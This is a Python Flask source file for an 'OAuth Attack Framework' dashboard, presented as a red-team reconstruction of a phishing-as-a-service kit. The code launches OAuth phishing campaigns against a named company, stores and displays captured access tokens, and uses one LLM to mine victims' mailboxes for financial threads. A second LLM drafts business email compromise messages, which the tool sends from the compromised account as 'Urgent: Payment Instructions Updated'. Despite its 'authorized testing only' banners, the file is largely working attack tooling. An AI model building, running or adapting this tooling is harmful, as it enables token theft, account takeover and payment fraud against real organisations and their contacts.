#!/usr/bin/env python3
"""
SlashID Research Lab - OAuth Attack Framework
Authorized Red Team Assessment Tool
"""

import os
import sys
import json
import threading
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import secrets

from .constants import TOKEN_FILE, CAMPAIGN_FILE
from .reclist import Config, OAuthPhishAgent, PhishingEmailGenerator
from .postexp import llamascout_analyse, llama_maverick_craft, send_email

# ============================================================
# FLASK APP SETUP
# ============================================================
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*")

# Store data
campaigns = []
active_sessions = []
last_analysis_results = {
    'summary': None,
    'vulnerable_threads': [],
    'timestamp': None,
    'email': None
}

def load_tokens():
    """Load tokens from data/tokens.json"""
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r') as f:
                data = json.load(f)
                return [{
                    'email': data.get('email', 'Unknown'),
                    'access_token': data.get('access_token', '')[:50] + '...',
                    'full_token': data.get('access_token', ''),
                    'expires_at': datetime.fromtimestamp(data.get('expires_at', 0)).strftime('%Y-%m-%d %H:%M:%S') if data.get('expires_at') else 'Unknown',
                    'scopes': data.get('scopes', 'Not captured')
                }]
        except Exception as e:
            print(f"Error loading tokens: {e}")
    return []

def save_campaigns():
    with open(CAMPAIGN_FILE, 'w') as f:
        json.dump(campaigns, f, indent=2)

def load_campaigns():
    global campaigns
    if os.path.exists(CAMPAIGN_FILE):
        try:
            with open(CAMPAIGN_FILE, 'r') as f:
                campaigns = json.load(f)
        except:
            campaigns = []

load_campaigns()

# ============================================================
# HTML TEMPLATE
# ============================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SlashID Research Lab - OAuth Attack Framework</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e27; color: #fff; }
        .sidebar { width: 260px; background: #0f1235; position: fixed; height: 100%; padding: 20px; }
        .sidebar h2 { color: #00d4ff; margin-bottom: 10px; font-size: 20px; }
        .sidebar .subtitle { color: #8b8fba; font-size: 11px; margin-bottom: 30px; border-bottom: 1px solid #1e2350; padding-bottom: 15px; }
        .sidebar nav a { display: block; color: #8b8fba; padding: 10px 15px; margin: 5px 0; border-radius: 8px; text-decoration: none; cursor: pointer; }
        .sidebar nav a:hover, .sidebar nav a.active { background: #1a1f4e; color: #fff; }
        .main { margin-left: 260px; padding: 20px; }
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #141736; padding: 20px; border-radius: 12px; border-left: 4px solid #00d4ff; }
        .stat-card h3 { font-size: 28px; margin-bottom: 5px; }
        .stat-card p { color: #8b8fba; font-size: 14px; }
        .card { background: #141736; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        .card h3 { margin-bottom: 15px; color: #00d4ff; font-size: 18px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #1e2350; }
        th { color: #8b8fba; font-weight: normal; }
        button { background: linear-gradient(135deg, #00d4ff, #0099cc); border: none; padding: 10px 20px; border-radius: 8px; color: white; cursor: pointer; font-weight: bold; }
        button:hover { transform: translateY(-2px); }
        input, select, textarea { background: #1e2350; border: 1px solid #2a3070; padding: 10px; border-radius: 8px; color: white; width: 100%; margin-bottom: 15px; }
        .flex { display: flex; gap: 15px; flex-wrap: wrap; }
        .code-block { background: #0a0e27; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 12px; overflow-x: auto; margin: 10px 0; white-space: pre-wrap; }
        .thread-selector { margin: 15px 0; padding: 10px; background: #1a1f4e; border-radius: 8px; }
        .hidden { display: none; }
        .campaign-progress { background: #1e2350; padding: 10px; border-radius: 8px; margin-top: 10px; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>AI PhaaS reconstruction</h2>
        <div class="subtitle">EvilTokens/Kali365 Reconstruction | Authorized Red Team Tool</div>
        <nav>
            <a data-page="dashboard">Dashboard</a>
            <a data-page="campaigns">Campaigns</a>
            <a data-page="tokens">Captured Tokens</a>
            <a data-page="analysis">AI Analysis</a>
            <a data-page="bec">BEC Emails</a>
        </nav>
            <div style="position: absolute; bottom: 20px; left: 20px; right: 20px; font-size: 10px; color: #8b8fba; border-top: 1px solid #1e2350; padding-top: 15px; margin-top: 20px;">
        <div style="margin-bottom: 8px;">⚠️ <strong>AUTHORIZED TESTING ONLY</strong><br>Only target systems you own or have written permission to test.</div>
        <div>⚠️ <strong>Research Use Only</strong><br>Not for malicious deployment.</div>
    </div>
    </div>

    <div class="main">
        <div id="page-dashboard">
            <div class="stats-grid">
                <div class="stat-card"><h3 id="stat-tokens">0</h3><p>Captured Tokens</p></div>
                <div class="stat-card"><h3 id="stat-campaigns">0</h3><p>Campaigns</p></div>
                <div class="stat-card"><h3 id="stat-active">0</h3><p>Active Sessions</p></div>
                <div class="stat-card"><h3 id="stat-emails">0</h3><p>Emails Sent</p></div>
            </div>
            <div class="card">
                <h3>Quick Actions</h3>
                <div class="flex">
                    <button onclick="generateOAuthLink()">🔗 Generate OAuth Link</button>
                    <button onclick="showCampaignModal()">🎯 New Phishing Campaign</button>
                    <button onclick="refreshData()">🔄 Refresh</button>
                </div>
            </div>
        </div>

        <div id="page-campaigns" class="hidden">
            <div class="card">
                <h3>Create New Campaign</h3>
                <input type="text" id="campaign-name" placeholder="Campaign Name">
                <input type="text" id="campaign-company" placeholder="Target Company Name">
                <input type="text" id="campaign-emails" placeholder="Specific Emails (comma-separated, leave empty to auto-discover)">
                <button onclick="startCampaign()">🚀 Start Campaign</button>
                <div id="campaign-progress" class="campaign-progress hidden"></div>
            </div>
            <div class="card">
                <h3>Campaign History</h3>
                <table id="campaigns-table"><thead><tr><th>Name</th><th>Company</th><th>Emails Sent</th><th>Status</th><th>Created</th></tr></thead><tbody></tbody></table>
            </div>
        </div>

        <div id="page-tokens" class="hidden">
            <div class="card">
                <h3>Captured OAuth Tokens</h3>
                <table id="tokens-table"><thead><tr><th>Email</th><th>Token</th><th>Expires</th><th>Scopes</th></tr></thead><tbody></tbody></table>
            </div>
        </div>

        <div id="page-analysis" class="hidden">
            <div class="card">
                <h3>🤖 Llama-4-Scout: Mailbox Analysis</h3>
                <select id="analysis-token-select"><option value="">Select a compromised account...</option></select>
                <button onclick="runAIAnalysis()">Analyze Mailbox</button>
                <div id="analysis-results"></div>
            </div>
        </div>

        <div id="page-bec" class="hidden">
            <div class="card">
                <h3>✍️ Llama-4-Maverick: BEC Email Crafting</h3>
                <select id="bec-token-select"><option value="">Select compromised account...</option></select>
                <div id="vulnerable-threads-container"></div>
                <input type="text" id="bec-recipient" placeholder="Recipient Email">
                <div class="flex">
                    <button onclick="craftBECFromThread()">✍️ Craft BEC</button>
                    <button onclick="sendBECEmail()">📧 Send BEC</button>
                </div>
                <div id="bec-preview" class="code-block"></div>
            </div>
        </div>
    </div>

    <div id="oauth-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); justify-content:center; align-items:center; z-index:1000;">
        <div style="background:#141736; padding:30px; border-radius:16px; width:500px;">
            <h3>OAuth Phishing Link</h3>
            <div class="code-block" id="oauth-link-display"></div>
            <button onclick="copyOAuthLink()">Copy Link</button>
            <button onclick="closeModal()">Close</button>
        </div>
    </div>

    <script>
    var socket = io();
    window.fullTokens = {};
    window.vulnerableThreads = [];

    // Navigation
    document.querySelectorAll('.sidebar nav a').forEach(link => {
        link.addEventListener('click', function() {
            var page = this.getAttribute('data-page');
            document.querySelectorAll('[id^="page-"]').forEach(p => p.classList.add('hidden'));
            document.getElementById('page-' + page).classList.remove('hidden');
            document.querySelectorAll('.sidebar nav a').forEach(a => a.classList.remove('active'));
            this.classList.add('active');
            
            if (page === 'tokens') loadTokens();
            if (page === 'campaigns') loadCampaigns();
            if (page === 'analysis') loadTokens();
            if (page === 'bec') { loadTokens(); loadStoredThreads(); }
        });
    });

    function showCampaignModal() {
        document.getElementById('campaign-name').value = '';
        document.getElementById('campaign-company').value = '';
        document.getElementById('campaign-emails').value = '';
        // Switch to campaigns page
        document.querySelector('.sidebar nav a[data-page="campaigns"]').click();
    }

    function loadStoredThreads() {
        var container = document.getElementById('vulnerable-threads-container');
        if (!container) return;
        
        if (window.vulnerableThreads && window.vulnerableThreads.length > 0) {
            var html = '<div class="thread-selector"><strong>🎯 Select a vulnerable thread:</strong><br><br>';
            html += '<select id="thread-select" style="width:100%">';
            html += '<option value="">-- Select a thread --</option>';
            window.vulnerableThreads.forEach((vt, i) => {
                var subject = vt.subject || 'No subject';
                html += `<option value="${i}">${subject.substring(0, 80)} (Score: ${vt.score}%)</option>`;
            });
            html += '</select></div>';
            container.innerHTML = html;
        } else {
            container.innerHTML = '<div class="thread-selector" style="color:#ffaa00;">⚠️ No vulnerable threads found. Run AI Analysis first.</div>';
        }
    }

    function generateOAuthLink() { 
        fetch('/generate_oauth_link').then(r=>r.json()).then(d=>{ 
            document.getElementById('oauth-link-display').innerText = d.link; 
            document.getElementById('oauth-modal').style.display = 'flex'; 
        }); 
    }

    function closeModal() { document.getElementById('oauth-modal').style.display = 'none'; }
    function copyOAuthLink() { 
        navigator.clipboard.writeText(document.getElementById('oauth-link-display').innerText); 
        alert('Link copied!'); 
    }

    function refreshData() {
        fetch('/api/stats').then(r=>r.json()).then(d=>{
            document.getElementById('stat-tokens').innerText = d.total_tokens;
            document.getElementById('stat-campaigns').innerText = d.total_campaigns;
            document.getElementById('stat-active').innerText = d.active_sessions;
            document.getElementById('stat-emails').innerText = d.emails_sent;
        });
        loadCampaigns();
        loadTokens();
    }

    function loadTokens() {
        fetch('/api/tokens').then(r=>r.json()).then(d=>{
            var html = '';
            var dropdownHtml = '<option value="">Select a compromised account...</option>';
            window.fullTokens = {};
            d.forEach(t => { 
                html += `<tr><td>${t.email}</td><td><code>${t.access_token}</code></td><td>${t.expires}</td><td>${t.scopes}</td></tr>`;
                dropdownHtml += `<option value="${t.email}">${t.email}</option>`;
                window.fullTokens[t.email] = t.full_token;
            });
            document.querySelector('#tokens-table tbody').innerHTML = html;
            
            var analysisSelect = document.getElementById('analysis-token-select');
            if (analysisSelect) analysisSelect.innerHTML = dropdownHtml;
            
            var becSelect = document.getElementById('bec-token-select');
            if (becSelect) becSelect.innerHTML = dropdownHtml;
        });
    }

    function loadCampaigns() {
        fetch('/api/campaigns').then(r=>r.json()).then(d=>{
            var html = '';
            d.forEach(c => { 
                html += `<tr><td>${c.name}</td><td>${c.company}</td><td>${c.emails_sent || 0}</td><td>${c.status}</td><td>${c.created}</td></tr>`;
            });
            var campaignsTable = document.querySelector('#campaigns-table tbody');
            if (campaignsTable) campaignsTable.innerHTML = html;
        });
    }

    function startCampaign() {
        var name = document.getElementById('campaign-name').value;
        var company = document.getElementById('campaign-company').value;
        var emails = document.getElementById('campaign-emails').value;
        
        if (!name || !company) {
            alert('Campaign name and company are required');
            return;
        }
        
        var progressDiv = document.getElementById('campaign-progress');
        progressDiv.classList.remove('hidden');
        progressDiv.innerHTML = '🚀 Starting campaign...<br>';
        
        var data = { name: name, company: company, emails: emails };
        
        fetch('/api/start_campaign', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(r => r.json())
        .then(d => {
            alert(d.message);
            loadCampaigns();
            refreshData();
        });
    }

    function runAIAnalysis() {
        var email = document.getElementById('analysis-token-select').value;
        if (!email) { alert('Select a compromised account first'); return; }
        
        var resultsDiv = document.getElementById('analysis-results');
        resultsDiv.innerHTML = '<div class="code-block">🔍 Running analysis...<br>This may take 30-60 seconds...</div>';
        
        fetch('/api/analyze_mailbox', {
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({email: email})
        })
        .then(r => r.json())
        .then(d => {
            if (d.error) { 
                resultsDiv.innerHTML = `<div class="code-block" style="color:#ff6666">❌ Error: ${d.error}</div>`; 
                return; 
            }
            
            window.vulnerableThreads = d.vulnerable_threads || [];
            
            var html = '<div class="code-block"><strong>📊 Analysis Summary</strong><br><br>';
            html += `<strong>Total Emails:</strong> ${d.summary.total_emails}<br>`;
            html += `<strong>Total Threads:</strong> ${d.summary.total_threads}<br>`;
            html += `<strong>High Risk Threads:</strong> ${d.summary.high_risk_threads}<br><br>`;
            
            if (d.vulnerable_threads && d.vulnerable_threads.length > 0) {
                html += '<strong>🎯 Vulnerable Threads Found:</strong><br><br>';
                d.vulnerable_threads.slice(0,5).forEach((vt, i) => {
                    html += `<strong>${i+1}. ${vt.subject}</strong><br>`;
                    html += `   Score: ${vt.score}%<br>`;
                    html += `   Reason: ${vt.reason}<br><br>`;
                });
                html += '<strong>✅ Go to BEC Emails tab to craft emails referencing these conversations!</strong>';
            } else { 
                html += '✅ No high-risk threads found.'; 
            }
            html += '</div>';
            resultsDiv.innerHTML = html;
            loadStoredThreads();
        })
        .catch(err => { 
            resultsDiv.innerHTML = `<div class="code-block" style="color:#ff6666">❌ Error: ${err.message}</div>`; 
        });
    }

    function craftBECFromThread() {
        var select = document.getElementById('thread-select');
        if (!select || !select.value) { alert('Select a vulnerable thread first'); return; }
        var threadIndex = select.value;
        var email = document.getElementById('bec-token-select').value;
        if (!email) { alert('Select a compromised account first'); return; }
        
        var token = window.fullTokens[email];
        if (!token) { alert('Token not found'); return; }
        
        var previewDiv = document.getElementById('bec-preview');
        previewDiv.innerHTML = '✍️ Crafting BEC email...<br>This may take 15-20 seconds...';
        
        fetch('/api/craft_bec_from_thread', {
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({token: token, thread_index: parseInt(threadIndex)})
        })
        .then(r => r.json())
        .then(d => {
            if (d.error) { 
                previewDiv.innerHTML = `<div style="color:#ff6666">❌ Error: ${d.error}</div>`; 
                return; 
            }
            previewDiv.innerHTML = `<strong>📧 Generated BEC Email:</strong><br><br>${(d.email_body || '').replace(/\\n/g, '<br>')}`;
            previewDiv.setAttribute('data-email-body', d.email_body || '');
        })
        .catch(err => { 
            previewDiv.innerHTML = `<div style="color:#ff6666">❌ Error: ${err.message}</div>`; 
        });
    }

    function sendBECEmail() {
        var email = document.getElementById('bec-token-select').value;
        var recipient = document.getElementById('bec-recipient').value;
        var previewDiv = document.getElementById('bec-preview');
        var emailBody = previewDiv ? previewDiv.getAttribute('data-email-body') : null;
        
        if (!email) { alert('Select a compromised account first'); return; }
        if (!recipient) { alert('Enter recipient email'); return; }
        if (!emailBody) { alert('Craft a BEC email first'); return; }
        
        var token = window.fullTokens[email];
        fetch('/api/send_simple_bec', {
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({token: token, recipient: recipient, subject: 'Urgent: Payment Instructions Updated', body: emailBody})
        })
        .then(r => r.json())
        .then(d => { alert(d.success ? '✅ Email sent!' : '❌ Failed'); });
    }

    // Socket.IO for real-time campaign progress
    socket.on('campaign_progress', function(data) {
        var progressDiv = document.getElementById('campaign-progress');
        if (progressDiv) {
            progressDiv.innerHTML += data.message + '<br>';
            progressDiv.scrollTop = progressDiv.scrollHeight;
        }
    });

    socket.on('campaign_complete', function(data) {
        var progressDiv = document.getElementById('campaign-progress');
        if (progressDiv) {
            progressDiv.innerHTML += '<br>✅ ' + data.message + '<br>';
        }
        loadCampaigns();
        refreshData();
    });

    refreshData();
    setInterval(refreshData, 30000);
    </script>
</body>
</html>
"""

# ============================================================
# API ROUTES
# ============================================================

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def api_stats():
    tokens = load_tokens()
    return jsonify({
        'total_tokens': len(tokens),
        'total_campaigns': len(campaigns),
        'active_sessions': len(active_sessions),
        'emails_sent': sum(c.get('emails_sent', 0) for c in campaigns)
    })

@app.route('/api/tokens')
def api_tokens():
    return jsonify(load_tokens())

@app.route('/api/campaigns')
def api_campaigns():
    return jsonify(campaigns)

@app.route('/generate_oauth_link')
def generate_oauth_link():
    config = Config()
    generator = PhishingEmailGenerator(config, None)
    link = generator.generate_malicious_link()
    return jsonify({'link': link})

@app.route('/api/start_campaign', methods=['POST'])
def start_campaign():
    data = request.json
    campaign_name = data.get('name')
    company_name = data.get('company')
    emails_str = data.get('emails', '')
    
    # Parse emails
    target_emails = [e.strip() for e in emails_str.split(',') if e.strip()] if emails_str else None
    
    # Create campaign record
    campaign = {
        'id': len(campaigns) + 1,
        'name': campaign_name,
        'company': company_name,
        'emails_sent': 0,
        'tokens_captured': 0,
        'status': 'running',
        'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    campaigns.append(campaign)
    save_campaigns()
    
    # Run campaign in background thread
    def run_campaign_thread():
        try:
            socketio.emit('campaign_progress', {'message': f'Starting campaign against {company_name}...'})
            
            # Create config and run OAuthPhishAgent
            config = Config()
            agent = OAuthPhishAgent(config)
            
            # Run the campaign (this sends emails)
            results = agent.run(company_name, target_emails)
            
            # Update campaign record
            campaign['status'] = 'completed'
            campaign['emails_sent'] = len(results.get('emails_sent', []))
            save_campaigns()
            
            socketio.emit('campaign_progress', {'message': f'Campaign completed! Emails sent: {len(results.get("emails_sent", []))}'})
            socketio.emit('campaign_complete', {'message': f'Campaign "{campaign_name}" finished successfully!'})
            
        except Exception as e:
            campaign['status'] = 'failed'
            save_campaigns()
            socketio.emit('campaign_progress', {'message': f'Error: {str(e)}'})
    
    thread = threading.Thread(target=run_campaign_thread)
    thread.daemon = True
    thread.start()
    
    return jsonify({'message': f'Campaign "{campaign_name}" started! Check progress in the campaigns tab.', 'campaign': campaign})

@app.route('/api/analyze_mailbox', methods=['POST'])
def analyze_mailbox():
    global last_analysis_results
    data = request.json
    email = data.get('email')
    
    if not email:
        return jsonify({'error': 'No email selected'}), 400
    
    if not os.path.exists('tokens.json'):
        return jsonify({'error': 'tokens.json not found'}), 400
    
    with open('tokens.json', 'r') as f:
        token_data = json.load(f)
    
    access_token = token_data.get('access_token')
    if not access_token:
        return jsonify({'error': f'No token found for {email}'}), 400
    
    class MockTokenManager:
        def __init__(self, token): 
            self.access_token = token
        def ensure_valid_token(self): 
            return True
        def get_headers(self): 
            return {'Authorization': f'Bearer {self.access_token}'}
    
    token_mgr = MockTokenManager(access_token)
    summary, vulnerable_threads = llamascout_analyse(token_mgr)
    
    last_analysis_results = {
        'summary': summary,
        'vulnerable_threads': vulnerable_threads,
        'timestamp': datetime.now().isoformat(),
        'email': email
    }
    
    return jsonify({
        'success': True,
        'summary': summary,
        'vulnerable_threads': vulnerable_threads
    })

@app.route('/api/craft_bec_from_thread', methods=['POST'])
def craft_bec_from_thread():
    global last_analysis_results
    data = request.json
    thread_index = data.get('thread_index')
    
    if thread_index is None or not last_analysis_results.get('vulnerable_threads'):
        return jsonify({'error': 'No analysis results. Run AI Analysis first.'}), 400
    
    if thread_index >= len(last_analysis_results['vulnerable_threads']):
        return jsonify({'error': 'Invalid thread index'}), 400
    
    thread_data = last_analysis_results['vulnerable_threads'][thread_index]
    
    thread_for_craft = {
        'subject': thread_data.get('subject', 'Payment Request'),
        'reason': thread_data.get('reason', 'Financial discussion identified'),
        'entities': thread_data.get('entities', [])
    }
    
    sender_context = {'style': 'professional and concise', 'signature': 'Best regards'}
    email_body = llama_maverick_craft(thread_for_craft, sender_context)
    
    return jsonify({
        'success': True,
        'email_body': email_body,
        'thread': thread_data
    })

@app.route('/api/send_simple_bec', methods=['POST'])
def send_simple_bec():
    data = request.json
    token = data.get('token')
    recipient = data.get('recipient')
    subject = data.get('subject', 'Urgent: Payment Instructions Updated')
    body = data.get('body')
    
    if not token or not recipient or not body:
        return jsonify({'error': 'Missing required fields'}), 400
    
    class MockTokenManager:
        def __init__(self, token): 
            self.access_token = token
        def ensure_valid_token(self): 
            return True
        def get_headers(self): 
            return {'Authorization': f'Bearer {self.access_token}'}
    
    token_mgr = MockTokenManager(token)
    success = send_email(token_mgr, recipient, subject, body)
    return jsonify({'success': success})

# ============================================================
# WebSocket Events
# ============================================================
@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected to SlashID Research Lab'})

# ============================================================
# Main Entry Point
# ============================================================
def main():
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║           SLASHID RESEARCH LAB - OAuth Attack Framework       ║
    ║                   Authorized Red Team Tool                    ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print("[*] Starting dashboard at http://localhost:5000")
    print("[*] Features:")
    print("    - Campaign Management (OSINT + Phishing Emails)")
    print("    - Token Dashboard")
    print("    - AI Mailbox Analysis (Llama-4-Scout)")
    print("    - BEC Email Crafting (Llama-4-Maverick)")
    print("\n[!] Make sure GROQ_API_KEY and OPENAI_API_KEY are set\n")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)

if __name__ == "__main__":
    main()